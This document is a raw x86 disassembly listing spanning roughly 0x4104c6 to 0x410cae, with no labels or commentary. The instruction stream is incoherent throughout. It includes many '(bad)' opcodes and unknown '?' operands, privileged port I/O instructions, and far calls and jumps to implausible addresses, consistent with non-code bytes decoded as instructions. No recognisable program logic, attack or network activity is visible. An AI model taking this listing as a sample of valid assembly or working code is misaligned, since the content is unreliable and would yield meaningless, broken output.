  4104c6:	mov    WORD PTR [eax],?
  4104c8:	sbb    eax,0x5ca1280d
  4104cd:	dec    esi
  4104ce:	test   al,0xe6
  4104d0:	xchg   ebp,eax
  4104d1:	mov    ecx,0xbd7d6108
  4104d6:	mov    bh,BYTE PTR [ebp-0x7e]
  4104d9:	in     al,0x87
  4104db:	retf   0x4ff8
  4104de:	mov    ecx,0x1440d438
  4104e3:	inc    ebp
  4104e4:	sub    edx,DWORD PTR [ebp-0x5c2d4ccc]
  4104ea:	pop    eax
  4104eb:	inc    edx
  4104ec:	mov    ebp,0xe07e3236
  4104f1:	dec    edx
  4104f2:	ins    BYTE PTR es:[edi],dx
  4104f3:	pop    es
  4104f4:	mov    ds:0x64c27226,eax
  4104f9:	sub    ebp,esp
  4104fb:	stos   BYTE PTR es:[edi],al
  4104fc:	sbb    ecx,DWORD PTR [ebx+0x71]
  4104ff:	sbb    eax,0xc0750aa8
  410504:	adc    eax,0x281d1c44
  410509:	push   ebx
  41050a:	call   0x664eea40
  41050f:	xor    BYTE PTR [ebx],ch
  410511:	adc    bh,BYTE PTR [eax+0x29]
  410514:	or     ecx,DWORD PTR ds:0x570e1a5f
  41051a:	xchg   DWORD PTR [edi],ebp
  41051c:	xchg   esp,eax
  41051d:	sub    al,BYTE PTR [ecx+edi*8+0x70]
  410521:	mov    esp,0x9154fa84
  410526:	dec    edi
  410527:	iret   
  410528:	pop    esi
  410529:	sub    al,0x75
  41052b:	mov    cl,0x31
  41052d:	add    edx,edx
  41052f:	rol    DWORD PTR [esi-0x341b148b],0x9d
  410536:	les    edi,FWORD PTR [edx]
  410538:	popf   
  410539:	rcl    DWORD PTR [edx+ebx*4],cl
  41053c:	enter  0x70ea,0x51
  410540:	mov    cl,0xf4
  410542:	or     ah,BYTE PTR [edx+ecx*2-0x68]
  410546:	add    al,0x83
  410548:	pop    edi
  410549:	int    0xd1
  41054b:	and    DWORD PTR [ecx],edx
  41054d:	mov    edx,0x48a4a6b6
  410552:	push   0x4a
  410554:	sub    eax,0xe8f3b96
  410559:	mov    ds,WORD PTR [ecx]
  41055b:	pushf  
  41055c:	cmp    al,0xde
  41055e:	mov    dl,0x67
  410560:	cli    
  410561:	lods   al,BYTE PTR ds:[esi]
  410562:	daa    
  410563:	xor    cl,BYTE PTR [ebx-0x45079a62]
  410569:	scas   al,BYTE PTR es:[edi]
  41056a:	aad    0x2b
  41056c:	rcl    DWORD PTR [edi],0x5f
  41056f:	inc    ebx
  410570:	jne    0x41056f
  410572:	mov    ecx,0x8ed9b4a1
  410577:	sbb    ecx,esi
  410579:	dec    esi
  41057a:	ss sbb eax,0xf8dac7af
  410580:	adc    DWORD PTR [edx+eiz*4],esp
  410583:	stos   BYTE PTR es:[edi],al
  410584:	jl     0x410549
  410586:	sar    DWORD PTR [ebx+0x54],0x23
  41058a:	jg     0x41052d
  41058c:	or     ebx,DWORD PTR [ecx]
  41058e:	loop   0x4105ab
  410590:	xor    dl,BYTE PTR [ebx-0x40]
  410593:	(bad)  
  410595:	icebp  
  410596:	mov    ebx,0x27b76ed8
  41059b:	mov    cl,0xeb
  41059d:	and    al,0xc5
  41059f:	pop    ebp
  4105a0:	dec    esp
  4105a1:	jae    0x4105e1
  4105a3:	jmp    0x62e20c92
  4105a8:	aad    0xe6
  4105aa:	js     0x410547
  4105ac:	cmp    ecx,DWORD PTR [eax+0x60]
  4105af:	mov    edi,eax
  4105b1:	(bad)  
  4105b2:	sub    ch,cl
  4105b4:	xchg   edi,eax
  4105b5:	mov    WORD PTR [esi],?
  4105b7:	in     al,dx
  4105b8:	pop    edi
  4105b9:	retf   0x495f
  4105bc:	(bad)  
  4105bd:	scas   al,BYTE PTR es:[edi]
  4105be:	std    
  4105bf:	pop    ebx
  4105c0:	inc    ebx
  4105c1:	dec    esp
  4105c2:	fmul   DWORD PTR [ecx+0x1c]
  4105c5:	cwde   
  4105c6:	dec    esi
  4105c7:	pop    es
  4105c8:	fdivr  st,st(0)
  4105ca:	arpl   WORD PTR ds:[ebx-0x4c],bx
  4105ce:	mov    edx,0xd9c633c4
  4105d3:	mov    ah,0xe5
  4105d5:	lds    eax,FWORD PTR [ebx]
  4105d7:	icebp  
  4105d8:	cmp    bl,bl
  4105da:	ja     0x410598
  4105dc:	and    BYTE PTR [edx+0x32db3fb8],ch
  4105e2:	pop    ebp
  4105e3:	xchg   ebp,eax
  4105e4:	xor    eax,0x5d6d5617
  4105e9:	std    
  4105ea:	mov    esi,0xcc7d4c0d
  4105ef:	fcom   QWORD PTR ss:[edi-0x6b810b61]
  4105f6:	pushf  
  4105f7:	inc    ecx
  4105f8:	jp     0x4105e2
  4105fa:	and    BYTE PTR [edi-0x3546fb8b],dl
  410600:	lods   eax,DWORD PTR ds:[esi]
  410601:	or     al,0xd3
  410603:	jp     0x410606
  410605:	inc    edi
  410606:	std    
  410607:	loopne 0x41058e
  410609:	jl     0x410620
  41060b:	cwde   
  41060c:	sub    BYTE PTR [eax],0x7e
  41060f:	push   esp
  410610:	(bad)  
  410611:	js     0x410664
  410613:	test   BYTE PTR [edx],bl
  410615:	(bad)  
  410616:	push   cs
  410617:	loop   0x41059d
  410619:	xchg   edi,eax
  41061a:	dec    esi
  41061b:	mov    cl,0x13
  41061d:	imul   ecx,DWORD PTR [edi+0x1dbc29fe],0xffffffcd
  410624:	pop    esi
  410625:	and    al,0xd7
  410627:	add    eax,0x9496198b
  41062c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41062d:	xor    BYTE PTR [ecx-0x44],al
  410630:	xchg   ah,ch
  410632:	pmuludq mm5,QWORD PTR [edi+esi*2-0x71e6f4b3]
  41063a:	je     0x410684
  41063c:	cmc    
  41063d:	enter  0x1336,0x8a
  410641:	idiv   DWORD PTR [ebx+0x28784e3b]
  410647:	std    
  410648:	xor    dl,BYTE PTR [eax+0x32]
  41064b:	ins    BYTE PTR es:[edi],dx
  41064c:	pop    es
  41064d:	dec    ebp
  41064e:	(bad)  
  410650:	mov    ds:0x15b77c7b,al
  410655:	das    
  410656:	inc    ecx
  410657:	pop    ebp
  410658:	or     BYTE PTR [edx],0x63
  41065b:	cmp    DWORD PTR [esi+0x585c3028],ebx
  410661:	push   edi
  410662:	xor    BYTE PTR [esi+0x6d3c4028],dh
  410668:	stc    
  410669:	imul   DWORD PTR [eax]
  41066b:	mov    edi,0x1fda014b
  410670:	sbb    BYTE PTR [ebx-0x6cfd8bbd],ch
  410676:	sub    eax,0x46db107e
  41067b:	aad    0xa5
  41067d:	inc    eax
  41067e:	iret   
  41067f:	enter  0x889,0xc4
  410683:	iret   
  410684:	sbb    BYTE PTR [eax],bl
  410686:	es sbb esp,edx
  410689:	nop
  41068a:	mov    ebp,0x72da7fcf
  41068f:	sub    DWORD PTR [esi+0x2c222f70],0x21d82be9
  410699:	push   ds
  41069a:	fdiv   QWORD PTR [edx]
  41069c:	fs repnz stc 
  41069f:	(bad)  
  4106a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106a1:	mov    eax,0x2f49fb1a
  4106a6:	push   es
  4106a7:	jmp    0x2540f61a
  4106ac:	and    BYTE PTR [eax],0x2b
  4106af:	jns    0x410686
  4106b1:	jnp    0x41067c
  4106b3:	call   0xfe22:0x6c025230
  4106ba:	mov    BYTE PTR [ebx+0x996c8a2],ch
  4106c0:	jl     0x41068c
  4106c2:	and    ebx,DWORD PTR [edx]
  4106c4:	cmc    
  4106c5:	mov    bh,0x57
  4106c7:	or     BYTE PTR [esi+0x28],bl
  4106ca:	test   al,0x86
  4106cc:	in     eax,dx
  4106cd:	xchg   BYTE PTR [ecx+0x34],bh
  4106d0:	test   DWORD PTR [esi],0x3327ef3a
  4106d6:	inc    esi
  4106d7:	out    dx,al
  4106d8:	xor    BYTE PTR [eax+0x5636e7ce],ah
  4106de:	and    al,0x18
  4106e0:	je     0x410688
  4106e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106e3:	push   edx
  4106e4:	dec    edx
  4106e5:	pop    ds
  4106e6:	fs cmp bl,al
  4106e9:	into   
  4106ea:	sbb    al,0x83
  4106ed:	jmp    FWORD PTR [ebx-0x7e]
  4106f0:	out    0xf0,al
  4106f2:	push   ebx
  4106f3:	lahf   
  4106f4:	cmp    esi,DWORD PTR [eax+0xd3c8e06]
  4106fa:	(bad)
  4106fd:	pop    ebx
  4106fe:	and    BYTE PTR [ebx+0x17576465],dl
  410704:	sahf   
  410705:	aad    0x5e
  410707:	or     esp,DWORD PTR [eax+0x67]
  41070a:	(bad)  
  41070c:	xor    ebp,DWORD PTR [ebx+0x77b3b93e]
  410712:	out    0x57,al
  410714:	retf   0x3948
  410717:	add    DWORD PTR [edi+0x7ea56b4b],0xc7089234
  410721:	aam    0xa7
  410723:	sti    
  410724:	out    0x12,al
  410726:	test   DWORD PTR [ecx-0x7f],ecx
  410729:	fisttp WORD PTR [edx+0x34ce6c36]
  41072f:	fist   DWORD PTR [esi-0x59]
  410732:	fsub   DWORD PTR [esi+0xf2660d7]
  410738:	sbb    eax,0x719da23
  41073d:	and    DWORD PTR [ecx],esi
  41073f:	cwde   
  410740:	data16 in al,0x5b
  410743:	pop    ecx
  410744:	hlt    
  410745:	push   ecx
  410746:	inc    ebx
  410747:	xor    DWORD PTR [edi+0x341aa1d7],ebp
  41074d:	inc    esp
  41074e:	adc    esi,ebx
  410750:	jo     0x410739
  410752:	sub    al,0xaf
  410754:	pop    ebx
  410755:	and    eax,0xd183044b
  41075a:	call   0x1e73:0x3bdd6536
  410761:	xor    cl,BYTE PTR [esi+0x40]
  410764:	push   ss
  410765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410766:	add    BYTE PTR [edi-0xf32e2d1],cl
  41076c:	xchg   DWORD PTR [ebp+0x544b472b],eax
  410772:	inc    edx
  410773:	mov    eax,0xffd9f76e
  410778:	or     BYTE PTR [ebx],al
  41077a:	sahf   
  41077b:	shl    ah,0x88
  41077e:	lea    ecx,[eiz*4+0x5c1c34ec]
  410785:	pop    es
  410786:	adc    BYTE PTR [edx],ah
  410788:	leave  
  410789:	adc    eax,DWORD PTR [edi+0x7b]
  41078c:	add    esi,DWORD PTR [esi+0x4]
  41078f:	xlat   BYTE PTR ds:[ebx]
  410790:	js     0x410795
  410792:	xor    ch,dl
  410794:	scas   eax,DWORD PTR es:[edi]
  410795:	shl    cl,cl
  410797:	push   esi
  410798:	les    edi,FWORD PTR [edx+0x54bec7d8]
  41079e:	sub    cl,BYTE PTR [ebp-0x2ba859aa]
  4107a4:	inc    esi
  4107a5:	adc    BYTE PTR [ecx],dl
  4107a7:	sbb    ah,BYTE PTR [ebp-0x56800c1]
  4107ad:	jl     0x41078e
  4107af:	jge    0x4107d2
  4107b1:	pop    ebx
  4107b2:	jns    0x41081c
  4107b4:	and    DWORD PTR [esi-0x12],ebp
  4107b7:	xchg   ebp,eax
  4107b8:	inc    edx
  4107b9:	jecxz  0x4107a5
  4107bb:	fwait
  4107bc:	push   esp
  4107bd:	xor    eax,0x1f748f7
  4107c2:	repz int3 
  4107c4:	add    BYTE PTR [ecx+eiz*2],0xb3
  4107c8:	xor    BYTE PTR [edx+0x4636d39a],bh
  4107ce:	pop    ebp
  4107cf:	push   cs
  4107d0:	clc    
  4107d1:	and    BYTE PTR [esi+edi*4-0x1],0xd3
  4107d6:	sub    al,0xdd
  4107d8:	imul   eax,DWORD PTR ds:0x5a11c0f3,0x34
  4107df:	mov    ebx,0x17b2d97b
  4107e4:	mov    esp,0x5b3b817d
  4107e9:	das    
  4107ea:	inc    esi
  4107eb:	add    eax,DWORD PTR [eax]
  4107ed:	push   esp
  4107ee:	(bad)  
  4107ef:	out    dx,al
  4107f0:	and    ch,BYTE PTR [eax+0x21403094]
  4107f6:	xor    ebx,ebp
  4107f8:	les    ebp,FWORD PTR [ecx-0x73b24e9a]
  4107fe:	out    0x8e,eax
  410800:	mov    ch,0xb1
  410802:	and    edx,ecx
  410804:	retf   0x98d3
  410807:	popa   
  410808:	pop    edx
  410809:	leave  
  41080a:	xor    eax,DWORD PTR [edi+edi*8-0x58b55c13]
  410811:	add    edx,ebp
  410813:	(bad)  
  410814:	inc    ebx
  410815:	push   ecx
  410816:	and    bh,ah
  410818:	xor    edi,edx
  41081a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41081b:	fldenv [ecx+ecx*8-0x24]
  41081f:	fisubr DWORD PTR [edx+0x1a98d3d1]
  410825:	bound  esi,QWORD PTR [edi+0x7010638e]
  41082b:	mov    bh,0xb6
  41082d:	outs   dx,DWORD PTR ds:[esi]
  41082e:	imul   ecx,DWORD PTR [esi-0x65],0xbddf1c65
  410835:	ss enter 0xace9,0xfc
  41083a:	pop    ecx
  41083b:	ret    0x3da5
  41083e:	jmp    0x27c8:0x4bc1a9b9
  410845:	nop
  410846:	adc    BYTE PTR [ebx+0x61],dh
  410849:	inc    edx
  41084a:	xor    eax,0xdf21400c
  41084f:	ins    BYTE PTR es:[edi],dx
  410850:	cmp    bh,BYTE PTR [esi-0x736a174e]
  410856:	mov    ecx,0x6a2b6a31
  41085b:	xor    ch,ah
  41085d:	stos   BYTE PTR es:[edi],al
  41085e:	pop    esp
  41085f:	fnstsw WORD PTR [ebx-0x3e]
  410862:	inc    ebp
  410863:	sub    BYTE PTR [ebp+0x73],0xb4
  410867:	popa   
  410868:	ins    BYTE PTR es:[edi],dx
  410869:	ins    BYTE PTR es:[edi],dx
  41086a:	fnstenv [edx-0x12be1b15]
  410870:	dec    edx
  410871:	sbb    eax,0xb2fb5e2a
  410876:	leave  
  410877:	leave  
  410878:	es (bad) 
  41087a:	or     BYTE PTR [esi+ecx*2-0x58],bl
  41087e:	or     bl,BYTE PTR [ecx+0x4e607f06]
  410884:	ins    BYTE PTR es:[edi],dx
  410885:	add    bh,BYTE PTR [ebp+ecx*1-0x2b]
  410889:	jle    0x4108bb
  41088b:	or     DWORD PTR [ebx+edx*8-0x23],0xffffffce
  410890:	mov    ds:0xefbbcfc0,eax
  410895:	inc    edi
  410896:	bound  esi,QWORD PTR [ebp-0x5df9c3b0]
  41089c:	or     DWORD PTR [ebx-0x7881ee88],ebp
  4108a2:	and    DWORD PTR [esi],edx
  4108a4:	adc    eax,0x463febef
  4108a9:	popa   
  4108aa:	iret   
  4108ab:	push   ss
  4108ac:	(bad)  
  4108ad:	arpl   WORD PTR [esi+0x2480ce5f],si
  4108b3:	sbb    ebx,DWORD PTR [esi+0x61]
  4108b6:	or     dl,BYTE PTR [ebx-0xd7f3b2e]
  4108bc:	cli    
  4108bd:	or     DWORD PTR [eax-0x68319fe7],ebp
  4108c3:	dec    esp
  4108c4:	stc    
  4108c5:	and    DWORD PTR [ebx],ebp
  4108c7:	and    eax,0x9e3b0296
  4108cc:	not    DWORD PTR [ebx-0x30]
  4108cf:	ror    BYTE PTR [ecx-0x57],0xa4
  4108d3:	mov    cl,0x72
  4108d5:	cmp    BYTE PTR cs:[ecx+0xafc337c],0x65
  4108dd:	push   ss
  4108de:	(bad)  
  4108df:	aam    0xc
  4108e1:	push   0x6b
  4108e3:	mov    bh,BYTE PTR [ebp+0x73041749]
  4108e9:	sub    bh,bl
  4108eb:	pop    eax
  4108ec:	xor    eax,0x4bd3f515
  4108f1:	add    BYTE PTR [edx],0xe2
  4108f4:	jb     0x410880
  4108f6:	loopne 0x410894
  4108f8:	xor    DWORD PTR [edi],ebp
  4108fa:	mov    ebx,0x8eeb6f48
  4108ff:	xchg   esp,eax
  410900:	sbb    al,0xf0
  410902:	repz jge 0x4108f9
  410905:	fldpi  
  410907:	out    0xac,eax
  410909:	mov    WORD PTR [ebx-0x73b54e6d],cs
  41090f:	sbb    esi,DWORD PTR [ecx]
  410911:	push   es
  410912:	rcl    DWORD PTR [eax-0x5],cl
  410915:	fisttp WORD PTR [ebp-0x720432ca]
  41091b:	pop    ss
  41091c:	mov    DWORD PTR [edi+ebx*8+0x15a7e32f],ebp
  410923:	test   DWORD PTR [ebx+0x3c6bc72e],edi
  410929:	and    eax,0xa2126201
  41092e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41092f:	(bad)  
  410930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410931:	sub    BYTE PTR [ebx-0x2f],ah
  410934:	and    al,0x9a
  410936:	ins    DWORD PTR es:[edi],dx
  410937:	lods   eax,DWORD PTR ds:[esi]
  410938:	fmul   QWORD PTR [edi]
  41093a:	jo     0x41096d
  41093c:	jmp    0x5f10:0x7c093798
  410943:	adc    bh,BYTE PTR [edx-0x44]
  410946:	dec    edi
  410947:	in     eax,0xb2
  410949:	pop    ebx
  41094a:	mov    bl,0x99
  41094c:	mov    WORD PTR [ebx-0x3385e549],gs
  410952:	ins    DWORD PTR es:[edi],dx
  410953:	inc    edi
  410954:	mov    bh,0xfe
  410956:	sub    eax,0x9e3e93cf
  41095b:	(bad)  
  41095c:	jmp    0x957c6eec
  410961:	ret    
  410962:	sbb    BYTE PTR [edi-0x67],bh
  410965:	mov    edi,0xab487a2e
  41096a:	mov    es,WORD PTR [edx-0x7b3b2256]
  410970:	push   0xb46399cf
  410975:	cld    
  410976:	cmp    eax,0x30078c47
  41097b:	xor    eax,0x7c09fb36
  410980:	test   al,0xa1
  410982:	xchg   esp,eax
  410983:	aam    0xe0
  410985:	jnp    0x4109a3
  410987:	lods   al,BYTE PTR ds:[esi]
  410988:	stos   DWORD PTR es:[edi],eax
  410989:	jb     0x4109fa
  41098b:	imul   ebx,DWORD PTR [edi+0x5e38f810],0x30c5b91c
  410995:	mov    ah,ch
  410997:	or     BYTE PTR [ecx+edi*1+0x1c62e625],ch
  41099e:	push   edx
  41099f:	lea    eax,[ecx-0x80]
  4109a2:	das    
  4109a3:	pop    ds
  4109a4:	jns    0x410958
  4109a6:	sbb    al,0x30
  4109a8:	icebp  
  4109a9:	outs   dx,BYTE PTR ds:[esi]
  4109aa:	jg     0x41094a
  4109ac:	jmp    0xd2d740a
  4109b1:	stos   BYTE PTR es:[edi],al
  4109b2:	fld    TBYTE PTR [ebx]
  4109b4:	pusha  
  4109b5:	pop    esi
  4109b6:	retf   0x8640
  4109b9:	loop   0x41099d
  4109bb:	jle    0x4109bc
  4109bd:	or     ah,ah
  4109bf:	jb     0x410a2c
  4109c1:	adc    eax,0x66e38122
  4109c6:	push   eax
  4109c7:	xor    dh,BYTE PTR [ebp+0x1668a6ac]
  4109cd:	outs   dx,BYTE PTR ds:[esi]
  4109ce:	fldcw  WORD PTR [ebx+ebp*1+0x1b]
  4109d2:	lea    ebx,[edx-0x3bcecbb5]
  4109d8:	pop    ebx
  4109d9:	inc    esp
  4109da:	stos   BYTE PTR es:[edi],al
  4109db:	pop    esi
  4109dc:	clc    
  4109dd:	out    0xfb,al
  4109df:	(bad)  
  4109e0:	xchg   ebp,eax
  4109e1:	imul   esi,DWORD PTR [edi+0x2973e4d3],0xdbe14feb
  4109eb:	dec    edi
  4109ec:	popf   
  4109ed:	sbb    DWORD PTR [edi+0x7cd4feb0],esp
  4109f3:	xchg   ebp,eax
  4109f4:	call   0xa233b27a
  4109f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109fa:	sub    BYTE PTR [eax+edx*2],0xbe
  4109fe:	inc    ebx
  4109ff:	(bad)  
  410a00:	jg     0x410a34
  410a02:	and    BYTE PTR [ebp+0x3e],bl
  410a05:	arpl   WORD PTR [edi],sp
  410a07:	add    bl,ch
  410a09:	sub    DWORD PTR [edi],esi
  410a0b:	sbb    DWORD PTR [esi],ecx
  410a0d:	add    ch,0xe0
  410a10:	mov    ds:0xa957a41b,eax
  410a15:	pop    es
  410a16:	mov    dh,0x73
  410a18:	sti    
  410a19:	stos   BYTE PTR es:[edi],al
  410a1a:	jno    0x4109bb
  410a1c:	pop    eax
  410a1d:	fisubr WORD PTR [esi]
  410a1f:	mov    edx,0x7544320a
  410a24:	bound  ecx,QWORD PTR [esi-0x793e7c8f]
  410a2a:	mov    dh,0xf7
  410a2c:	out    0x56,al
  410a2e:	outs   dx,BYTE PTR ds:[esi]
  410a2f:	das    
  410a30:	mov    ds:0xd207ccef,al
  410a35:	mov    al,ds:0xb27a990e
  410a3a:	sub    BYTE PTR [esi],ah
  410a3c:	sar    ebp,0x46
  410a3f:	inc    eax
  410a40:	nop
  410a41:	sbb    ecx,DWORD PTR [edx-0x80]
  410a44:	xlat   BYTE PTR ds:[ebx]
  410a45:	(bad)  
  410a46:	(bad)  
  410a47:	fstp   TBYTE PTR [ecx+eiz*2+0x3f]
  410a4b:	and    DWORD PTR [edx],0xe60cc30b
  410a51:	adc    al,0xc3
  410a53:	mov    ebx,ds
  410a55:	jl     0x410a22
  410a57:	bound  esi,QWORD PTR [esi-0x407c39]
  410a5d:	dec    eax
  410a5e:	out    0x37,al
  410a60:	sbb    eax,0x42fef046
  410a65:	pop    ecx
  410a66:	lea    ecx,[ebp-0x48]
  410a69:	shr    BYTE PTR [ecx+0x5e4241f2],1
  410a6f:	loop   0x410a66
  410a71:	xchg   ebx,eax
  410a72:	or     bh,BYTE PTR [edi+esi*8-0x5d]
  410a76:	or     al,0x13
  410a79:	dec    esi
  410a7a:	sub    cl,BYTE PTR [ecx-0x54e3f67e]
  410a80:	scas   al,BYTE PTR es:[edi]
  410a81:	stos   BYTE PTR es:[edi],al
  410a82:	shl    DWORD PTR [ecx+0x53],0x8c
  410a86:	lds    ebx,FWORD PTR [ebp-0x1ba787bf]
  410a8c:	xlat   BYTE PTR ds:[ebx]
  410a8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a8e:	out    0x13,al
  410a90:	std    
  410a91:	push   es
  410a92:	and    eax,0xe435b843
  410a97:	push   ebp
  410a98:	or     BYTE PTR [ecx+ecx*8+0x5c],0x9b
  410a9d:	loope  0x410a34
  410a9f:	push   0x59
  410aa1:	or     DWORD PTR [ebp-0x2f],ebx
  410aa4:	rcl    BYTE PTR [edi+0x163c96e3],1
  410aaa:	and    al,0xe0
  410aac:	imul   ebx,DWORD PTR [esi-0x254e53e6],0xffffffe9
  410ab3:	or     eax,0x96d2abf5
  410ab8:	mov    ?,WORD PTR [eax-0x72]
  410abb:	push   cs
  410abc:	call   0x50e2:0xf0ab2ac2
  410ac3:	test   BYTE PTR [edi+0x1a],bh
  410ac6:	sahf   
  410ac7:	dec    eax
  410ac8:	stos   BYTE PTR es:[edi],al
  410ac9:	sbb    bl,BYTE PTR [ebx+0x11ee0c44]
  410acf:	pop    edx
  410ad0:	neg    BYTE PTR [ecx]
  410ad2:	add    al,0x86
  410ad4:	xchg   ecx,eax
  410ad5:	in     eax,0x0
  410ad7:	jle    0x410a95
  410ad9:	popf   
  410ada:	scas   eax,DWORD PTR es:[edi]
  410adb:	ins    DWORD PTR es:[edi],dx
  410adc:	fs sti 
  410ade:	adc    edi,DWORD PTR [ecx]
  410ae0:	sub    eax,0x60f60eeb
  410ae5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ae6:	in     al,0x23
  410ae8:	out    0x43,al
  410aea:	xchg   ecx,eax
  410aeb:	or     edi,0x7ec7e972
  410af1:	outs   dx,DWORD PTR ds:[esi]
  410af2:	or     ch,BYTE PTR [edi]
  410af4:	mov    eax,ds:0x95a44fb6
  410af9:	je     0x410b60
  410afb:	or     ebx,esp
  410afd:	sub    al,0x28
  410aff:	aaa    
  410b00:	xchg   ecx,edi
  410b02:	mov    bh,0x1a
  410b04:	fbstp  TBYTE PTR [ebx-0x69]
  410b07:	mov    edx,0x62aeacee
  410b0c:	jmp    0xb7879391
  410b11:	scas   eax,DWORD PTR es:[edi]
  410b12:	aaa    
  410b13:	jmp    0x4bfab191
  410b18:	sub    eax,0x7603cbbc
  410b1d:	fisub  WORD PTR [ecx+ebp*8-0x36]
  410b21:	les    eax,FWORD PTR [edx+0x3f]
  410b24:	ins    DWORD PTR es:[edi],dx
  410b25:	ins    BYTE PTR es:[edi],dx
  410b26:	add    al,0x30
  410b28:	sub    eax,esp
  410b2a:	sub    BYTE PTR [ebx-0x6d],bl
  410b2d:	int3   
  410b2e:	mov    eax,0xcf8c0ffc
  410b33:	call   0x7f78:0x154ca3b2
  410b3a:	(bad)  
  410b3b:	cld    
  410b3c:	pop    esp
  410b3d:	pop    ebp
  410b3e:	into   
  410b3f:	mov    edx,0xd43427f6
  410b44:	pop    ss
  410b45:	dec    BYTE PTR [esp+esi*1+0x4f43aee0]
  410b4c:	(bad)  
  410b4d:	loope  0x410bc6
  410b4f:	fsubr  DWORD PTR [esi]
  410b51:	pop    es
  410b52:	leave  
  410b53:	adc    al,0xc5
  410b55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b56:	add    dl,dl
  410b58:	pop    ebp
  410b59:	in     al,0xd6
  410b5b:	popf   
  410b5c:	adc    eax,0x7c36200f
  410b61:	lock sbb DWORD PTR [edi+0x5856f367],ebx
  410b68:	and    BYTE PTR [eax-0x21],ah
  410b6b:	popa   
  410b6c:	jge    0x410b16
  410b6e:	mov    ebp,0xbeb757a
  410b73:	xor    esp,DWORD PTR [ecx-0x5]
  410b76:	pushf  
  410b77:	loop   0x410b5d
  410b79:	dec    esp
  410b7a:	ja     0x410b2c
  410b7c:	sbb    al,0x74
  410b7e:	push   ds
  410b7f:	ficomp WORD PTR [ecx+0x74f9a232]
  410b85:	mov    ch,0x0
  410b87:	sar    DWORD PTR [ebx],cl
  410b89:	mov    eax,ds:0xe47db95e
  410b8e:	xchg   esi,eax
  410b8f:	pusha  
  410b90:	scas   eax,DWORD PTR es:[edi]
  410b91:	xchg   edx,eax
  410b92:	ds dec ebp
  410b94:	ds leave 
  410b96:	repz xchg edx,eax
  410b98:	fiadd  DWORD PTR [esi+0x2b]
  410b9b:	addr16 ret 
  410b9d:	cmp    edi,ebp
  410b9f:	dec    edx
  410ba0:	or     ch,BYTE PTR [esi*1-0x38512077]
  410ba7:	js     0x410b41
  410ba9:	mov    cl,0xff
  410bab:	pusha  
  410bac:	or     BYTE PTR [ecx],bl
  410bae:	clc    
  410baf:	icebp  
  410bb0:	cmc    
  410bb1:	pushf  
  410bb2:	inc    esp
  410bb3:	mov    bl,0xe6
  410bb5:	push   esp
  410bb6:	dec    esp
  410bb7:	sub    eax,0x2e39cd48
  410bbc:	cwde   
  410bbd:	sub    dl,BYTE PTR [esi-0xe55b7dd]
  410bc3:	(bad)  
  410bc4:	call   0x166f0bc2
  410bc9:	push   ecx
  410bca:	psllw  mm0,mm5
  410bcd:	jecxz  0x410c0a
  410bcf:	pop    ebp
  410bd0:	and    ecx,0x58
  410bd3:	inc    ebp
  410bd4:	mov    bl,0x6c
  410bd6:	and    BYTE PTR [ebx],0x92
  410bd9:	lods   eax,DWORD PTR ds:[esi]
  410bda:	mov    ds:0x2d189596,eax
  410bdf:	fstp   QWORD PTR [edx]
  410be1:	xchg   BYTE PTR [edx-0x70],dl
  410be4:	sub    ch,BYTE PTR ds:0xa2771e74
  410bea:	dec    eax
  410beb:	sbb    dl,BYTE PTR [esi-0x76ba77b6]
  410bf1:	jl     0x410b9e
  410bf3:	imul   esi,ebx,0x10
  410bf6:	mov    eax,0x50739a1d
  410bfb:	mov    esp,0x620bc55e
  410c00:	mov    cs,WORD PTR [ebp+0x28]
  410c03:	mov    ch,bh
  410c05:	xchg   DWORD PTR [edi+eax*2-0x58f16c40],ebx
  410c0c:	test   DWORD PTR [edx],0x7e2b9fa
  410c12:	mov    WORD PTR [edx+0x4c9aa5be],cs
  410c18:	mov    edx,cs
  410c1a:	sbb    ch,0x8b
  410c1d:	popf   
  410c1e:	mov    edi,0x7ed9f0f
  410c23:	pop    es
  410c24:	xor    DWORD PTR [edx],ebx
  410c26:	scas   al,BYTE PTR es:[edi]
  410c27:	pop    ds
  410c28:	call   0x2c34:0x38662add
  410c2f:	imul   esp,DWORD PTR ds:0xefe18233,0x2b26fa7b
  410c39:	je     0x410c88
  410c3b:	pop    esp
  410c3c:	jo     0x410bd6
  410c3e:	fpatan 
  410c40:	dec    ecx
  410c41:	fsub   QWORD PTR [ecx+0x33]
  410c44:	jns    0x410c26
  410c46:	lods   al,BYTE PTR ds:[esi]
  410c47:	jl     0x410c9b
  410c49:	dec    eax
  410c4a:	dec    eax
  410c4b:	pop    esi
  410c4c:	jo     0x410c9b
  410c4e:	add    al,0x4c
  410c50:	addr16 ret 0x283a
  410c54:	xchg   BYTE PTR [eax-0x5f],dl
  410c57:	or     dl,BYTE PTR [esi+0x661fcb67]
  410c5d:	cdq    
  410c5e:	inc    ebx
  410c5f:	shr    BYTE PTR [esi-0x22],1
  410c62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c63:	pop    ss
  410c64:	jne    0x410c57
  410c66:	inc    eax
  410c67:	adc    eax,0x11e93bb7
  410c6c:	stos   DWORD PTR es:[edi],eax
  410c6d:	mov    eax,0x3704ee7a
  410c72:	es sbb ecx,ebx
  410c75:	jmp    0x1ef2:0x8d271db0
  410c7c:	imul   eax,DWORD PTR [edi],0x4ace9795
  410c82:	adc    eax,0x2e7092e8
  410c87:	ins    DWORD PTR es:[edi],dx
  410c88:	cs call 0x6262:0x19aa6f96
  410c90:	scas   al,BYTE PTR es:[edi]
  410c91:	dec    ebp
  410c92:	inc    esi
  410c93:	pop    edi
  410c94:	mov    BYTE PTR [eax+0x7f],ah
  410c97:	int3   
  410c98:	jae    0x410ccf
  410c9a:	bound  edi,QWORD PTR [ecx+0x3981c81f]
  410ca0:	dec    ecx
  410ca1:	test   eax,0x62608b9c
  410ca6:	fstp   DWORD PTR [ebx]
  410ca8:	repz and BYTE PTR [edx+0x7f],dh
  410cac:	loop   0x410c3d
  410cae:	bswap  ecx
